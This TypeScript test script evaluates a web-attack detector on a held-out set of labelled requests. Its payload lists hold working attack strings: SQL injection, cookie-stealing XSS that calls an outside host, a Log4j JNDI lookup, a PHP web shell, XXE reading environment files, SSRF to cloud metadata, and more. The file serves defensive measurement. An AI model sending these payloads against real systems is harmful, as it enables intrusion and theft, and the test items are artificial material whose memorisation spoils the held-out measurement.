/**
 * HELD-OUT SET B — clean generalisation measurement
 *
 * Why a second set exists
 *   Set A (audit/eval_harness.ts) is contaminated. Its failures were visible
 *   before the rules that fix them were written, so a score on it is a
 *   regression baseline, not evidence of generalisation. Reusing it would be
 *   the same mistake that produced the rejected 100%.
 *
 * This file separates two claims that are usually conflated, because they are
 * worth very different amounts:
 *
 *   TIER 1 — instance generalisation.
 *     Different payload instances of classes the rules DO cover. Passing means
 *     the rules capture the class rather than the specific strings they were
 *     written against. A real result, but a modest one.
 *
 *   TIER 2 — class generalisation.
 *     Attack classes with NO corresponding rule at time of writing: SSI, XSLT,
 *     request smuggling, JWT alg-confusion, zip slip, formula injection, XML
 *     entity expansion, ReDoS. This is the honest test, and a signature
 *     detector is expected to do badly on it. A low Tier 2 score is not a bug
 *     to be patched away — it is the measured limit of the approach, and the
 *     argument for the learned component in Phase 3 of the plan.
 *
 *   BENIGN — fresh legitimate traffic, again including attack-shaped text.
 *
 * Reporting Tier 1 and Tier 2 separately is the point. A blended average would
 * hide exactly the weakness the reader needs to see.
 *
 * Run:  npx tsx audit/eval_holdout_b.ts
 */

const BASE = 'http://127.0.0.1:3000';
const KEY = process.env.ADMIN_API_KEY || 'test_admin_key_123';
const DEPLOYED_PREVALENCE = 0.02;

type Label = 'MALICIOUS' | 'BENIGN';
type Tier = 'TIER1_INSTANCE' | 'TIER2_CLASS' | 'BENIGN';

interface Sample { label: Label; tier: Tier; family: string; payload: string; }

/* ---------- TIER 1: covered classes, unseen instances ---------- */
const TIER1: Sample[] = [
  { label: 'MALICIOUS', tier: 'TIER1_INSTANCE', family: 'SQLI', payload: "x' AND (SELECT 1 FROM pg_catalog.pg_tables LIMIT 1)='1" },
  { label: 'MALICIOUS', tier: 'TIER1_INSTANCE', family: 'SQLI', payload: "9999 UNION ALL SELECT NULL,table_name,NULL FROM information_schema.tables" },
  { label: 'MALICIOUS', tier: 'TIER1_INSTANCE', family: 'XSS', payload: '<details open ontoggle=fetch("//x.io/"+document.cookie)>' },
  { label: 'MALICIOUS', tier: 'TIER1_INSTANCE', family: 'XSS', payload: "<video><source onerror=javascript:alert(document.domain)>" },
  { label: 'MALICIOUS', tier: 'TIER1_INSTANCE', family: 'TRAVERSAL', payload: 'template=..%5c..%5c..%5cboot.ini' },
  { label: 'MALICIOUS', tier: 'TIER1_INSTANCE', family: 'RCE', payload: 'page=data:text/plain,<?php passthru($_REQUEST["x"]); ?>' },
  { label: 'MALICIOUS', tier: 'TIER1_INSTANCE', family: 'RCE', payload: 'log4j=${jndi:rmi://10.9.9.9:1099/Exploit}' },
  { label: 'MALICIOUS', tier: 'TIER1_INSTANCE', family: 'SSTI', payload: '{{ config.items() * 7 }}' },
  { label: 'MALICIOUS', tier: 'TIER1_INSTANCE', family: 'XXE', payload: '<!DOCTYPE d [<!ENTITY e SYSTEM "file:///proc/self/environ">]><d>&e;</d>' },
  { label: 'MALICIOUS', tier: 'TIER1_INSTANCE', family: 'NOSQL', payload: '{"email":{"$regex":".*"},"pwd":{"$ne":1}}' },
  { label: 'MALICIOUS', tier: 'TIER1_INSTANCE', family: 'SSRF', payload: 'callback=http://metadata.google.internal/computeMetadata/v1/' },
  { label: 'MALICIOUS', tier: 'TIER1_INSTANCE', family: 'DESERIALIZATION', payload: 'state=O:8:"stdClass":1:{s:4:"exec";s:6:"whoami";}' },
  { label: 'MALICIOUS', tier: 'TIER1_INSTANCE', family: 'PROTO-POLLUTION', payload: '{"settings":{"constructor":{"prototype":{"admin":1}}}}' },
  { label: 'MALICIOUS', tier: 'TIER1_INSTANCE', family: 'MASS-ASSIGN', payload: '{"name":"kim","email":"k@x.io","isAdmin":true}' },
  { label: 'MALICIOUS', tier: 'TIER1_INSTANCE', family: 'LDAP', payload: 'filter=(&(cn=*)(userPassword=*))' }
];

/* ---------- TIER 2: classes with no rule written for them ---------- */
const TIER2: Sample[] = [
  { label: 'MALICIOUS', tier: 'TIER2_CLASS', family: 'SSI-injection', payload: '<!--#exec cmd="/bin/id" -->' },
  { label: 'MALICIOUS', tier: 'TIER2_CLASS', family: 'XSLT-injection', payload: '<xsl:value-of select="system-property(\'xsl:vendor\')"/>' },
  { label: 'MALICIOUS', tier: 'TIER2_CLASS', family: 'request-smuggling', payload: 'Transfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nG' },
  { label: 'MALICIOUS', tier: 'TIER2_CLASS', family: 'jwt-alg-none', payload: 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0.' },
  { label: 'MALICIOUS', tier: 'TIER2_CLASS', family: 'zip-slip', payload: 'filename=../../../../opt/app/config/settings.yml' },
  { label: 'MALICIOUS', tier: 'TIER2_CLASS', family: 'formula-injection', payload: '=cmd|\'/C calc\'!A0' },
  { label: 'MALICIOUS', tier: 'TIER2_CLASS', family: 'billion-laughs', payload: '<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">' },
  { label: 'MALICIOUS', tier: 'TIER2_CLASS', family: 'redos', payload: 'q=' + 'a'.repeat(60) + '!' },
  { label: 'MALICIOUS', tier: 'TIER2_CLASS', family: 'cache-poison', payload: 'X-Forwarded-Scheme: nothttps\r\nX-Forwarded-Host: attacker.test' },
  { label: 'MALICIOUS', tier: 'TIER2_CLASS', family: 'cors-wildcard-abuse', payload: 'Origin: null' },
  { label: 'MALICIOUS', tier: 'TIER2_CLASS', family: 'idor-enumeration', payload: 'GET /api/v1/invoices/1001,1002,1003,1004,1005,1006,1007,1008' },
  { label: 'MALICIOUS', tier: 'TIER2_CLASS', family: 'unicode-bypass', payload: 'file=．．／etc／passwd' }
];

/* ---------- BENIGN: fresh legitimate traffic ---------- */
const BENIGN: Sample[] = [
  { label: 'BENIGN', tier: 'BENIGN', family: 'ordinary', payload: 'GET /api/v1/catalog?category=laptops&inStock=true' },
  { label: 'BENIGN', tier: 'BENIGN', family: 'ordinary', payload: 'POST /api/v1/reviews {"productId":"P-9931","rating":5}' },
  { label: 'BENIGN', tier: 'BENIGN', family: 'ordinary', payload: 'GET /api/v1/shipments/TRK-4482/status' },
  { label: 'BENIGN', tier: 'BENIGN', family: 'ordinary', payload: 'PATCH /api/v1/settings {"theme":"dark","language":"ar"}' },
  { label: 'BENIGN', tier: 'BENIGN', family: 'ordinary', payload: 'GET /static/fonts/inter-var.woff2' },
  { label: 'BENIGN', tier: 'BENIGN', family: 'ordinary', payload: 'POST /api/v1/support/attachments {"name":"receipt.pdf","size":48211}' },
  { label: 'BENIGN', tier: 'BENIGN', family: 'ordinary', payload: 'GET /api/v1/reports/monthly?from=2026-08-01&to=2026-08-31' },
  { label: 'BENIGN', tier: 'BENIGN', family: 'ordinary', payload: 'DELETE /api/v1/sessions/current' },
  { label: 'BENIGN', tier: 'BENIGN', family: 'ordinary', payload: 'GET /api/v1/team/members?role=engineer&active=1' },
  { label: 'BENIGN', tier: 'BENIGN', family: 'ordinary', payload: 'POST /api/v1/webhooks/test {"url":"https://hooks.partner.example/inbound"}' },

  // Attack-shaped but legitimate — fresh instances of the false-positive trap
  { label: 'BENIGN', tier: 'BENIGN', family: 'tricky', payload: 'POST /api/v1/kb {"title":"Understanding UNION and JOIN in reporting queries"}' },
  { label: 'BENIGN', tier: 'BENIGN', family: 'tricky', payload: 'POST /api/v1/incidents {"summary":"Customer reported an XSS warning in the console"}' },
  { label: 'BENIGN', tier: 'BENIGN', family: 'tricky', payload: 'GET /api/v1/releases/v2.1.0/../v2.2.0/changelog.md' },
  { label: 'BENIGN', tier: 'BENIGN', family: 'tricky', payload: 'POST /api/v1/tasks {"note":"Review the eval() usage flagged by the linter"}' },
  { label: 'BENIGN', tier: 'BENIGN', family: 'tricky', payload: 'GET /api/v1/audit?event=user.role.changed&actor=ops' },
  { label: 'BENIGN', tier: 'BENIGN', family: 'tricky', payload: 'POST /api/v1/templates {"body":"Dear {{customerName}}, your order shipped."}' },
  { label: 'BENIGN', tier: 'BENIGN', family: 'tricky', payload: 'POST /api/v1/notes {"text":"Escalate if the host header looks rewritten"}' },
  { label: 'BENIGN', tier: 'BENIGN', family: 'tricky', payload: 'GET /api/v1/token/introspect?jti=eyJhbGciOiJSUzI1NiIsImtpZCI6ImFiYyJ9' },
  { label: 'BENIGN', tier: 'BENIGN', family: 'tricky', payload: 'POST /api/v1/glossary {"term":"deserialization","definition":"Rebuilding an object from bytes"}' },
  { label: 'BENIGN', tier: 'BENIGN', family: 'tricky', payload: 'POST /api/v1/config/import {"yaml":"retries: 3\\ntimeout: 30"}' },
  { label: 'BENIGN', tier: 'BENIGN', family: 'tricky', payload: 'GET /api/v1/search?q=how+to+prevent+prototype+pollution' },
  { label: 'BENIGN', tier: 'BENIGN', family: 'tricky', payload: 'POST /api/v1/forms {"schema":{"role":{"type":"string","enum":["viewer","editor"]}}}' }
];

interface Scored extends Sample { predicted: Label; verdict: string; score: number; sigs: string[]; }

async function classify(s: Sample, nonce: number): Promise<Scored> {
  const res = await fetch(`${BASE}/api/v1/agent/ai-analyze`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'x-api-key': KEY },
    body: JSON.stringify({
      packet: {
        srcIp: `10.30.${nonce % 250}.${(nonce * 11) % 250}`,
        dstIp: '10.0.1.10',
        port: 443,
        protocol: 'HTTPS',
        vector: 'UNKNOWN',
        payload: s.payload
      }
    })
  });
  const d: any = await res.json().catch(() => ({}));
  const verdict = String(d?.verdict ?? 'UNKNOWN');
  return {
    ...s,
    verdict,
    score: Number(d?.detection?.score ?? 0),
    sigs: (d?.detection?.signatures ?? []) as string[],
    predicted: verdict === 'ALLOW' ? 'BENIGN' : 'MALICIOUS'
  };
}

const pct = (n: number) => (n * 100).toFixed(1) + '%';

(async () => {
  const health = await fetch(`${BASE}/api/health`).catch(() => null);
  if (!health?.ok) { console.error(`Server not reachable at ${BASE}.`); process.exit(2); }

  const all = [...TIER1, ...TIER2, ...BENIGN];
  const scored: Scored[] = [];
  let i = 0;
  for (const s of all) scored.push(await classify(s, i++));

  const t1 = scored.filter(r => r.tier === 'TIER1_INSTANCE');
  const t2 = scored.filter(r => r.tier === 'TIER2_CLASS');
  const bn = scored.filter(r => r.tier === 'BENIGN');

  const recall = (rows: Scored[]) => rows.filter(r => r.predicted === 'MALICIOUS').length / (rows.length || 1);
  const FP = bn.filter(r => r.predicted === 'MALICIOUS').length;
  const fpr = FP / (bn.length || 1);

  console.log('\n' + '='.repeat(72));
  console.log('  HELD-OUT SET B — never used to develop any rule');
  console.log('='.repeat(72));

  console.log(`\n  TIER 1  covered classes, unseen instances`);
  console.log(`    recall ${pct(recall(t1))}  (${t1.filter(r => r.predicted === 'MALICIOUS').length}/${t1.length})`);
  console.log(`    -> does a rule capture its class, or only the string it was written against?`);

  console.log(`\n  TIER 2  classes with NO rule  <-- the honest limit`);
  console.log(`    recall ${pct(recall(t2))}  (${t2.filter(r => r.predicted === 'MALICIOUS').length}/${t2.length})`);
  console.log(`    -> a low number here is the measured ceiling of signature detection,`);
  console.log(`       not a defect to patch. It is the case for a learned component.`);

  console.log(`\n  BENIGN  fresh legitimate traffic`);
  console.log(`    false positives ${FP}/${bn.length}   FPR ${pct(fpr)}`);

  // Combined attack recall, then the base-rate projection an analyst lives with.
  const attacks = [...t1, ...t2];
  const rAll = recall(attacks);
  const p = DEPLOYED_PREVALENCE;
  const den = (rAll * p) + (fpr * (1 - p));
  console.log(`\n  AT ${pct(p)} DEPLOYED PREVALENCE`);
  console.log(`    overall attack recall            ${pct(rAll)}`);
  console.log(`    analyst-visible precision        ${den ? pct((rAll * p) / den) : 'n/a'}`);
  console.log(`    false alarms per 10,000 requests ${(fpr * (1 - p) * 10000).toFixed(1)}`);

  const missedT1 = t1.filter(r => r.predicted === 'BENIGN');
  if (missedT1.length) {
    console.log('\n  TIER 1 MISSES  (these ARE defects — the class is covered)');
    for (const m of missedT1) console.log(`    ${m.family.padEnd(18)} ${m.payload.slice(0, 62).replace(/\r?\n/g, ' ')}`);
  }
  const missedT2 = t2.filter(r => r.predicted === 'BENIGN');
  if (missedT2.length) {
    console.log('\n  TIER 2 MISSES  (expected — no rule exists for these)');
    for (const m of missedT2) console.log(`    ${m.family.padEnd(22)} ${m.payload.slice(0, 58).replace(/\r?\n/g, ' ')}`);
  }
  const alarms = bn.filter(r => r.predicted === 'MALICIOUS');
  if (alarms.length) {
    console.log('\n  FALSE ALARMS');
    for (const a of alarms) console.log(`    score=${a.score} ${a.payload.slice(0, 58)}  ${JSON.stringify(a.sigs.slice(0, 2))}`);
  }

  console.log('\n  ' + '-'.repeat(68));
  console.log('  Set B must not be used to write rules. Doing so converts it into');
  console.log('  Set A and the next measurement becomes worthless.\n');

  process.exit(0);
})();
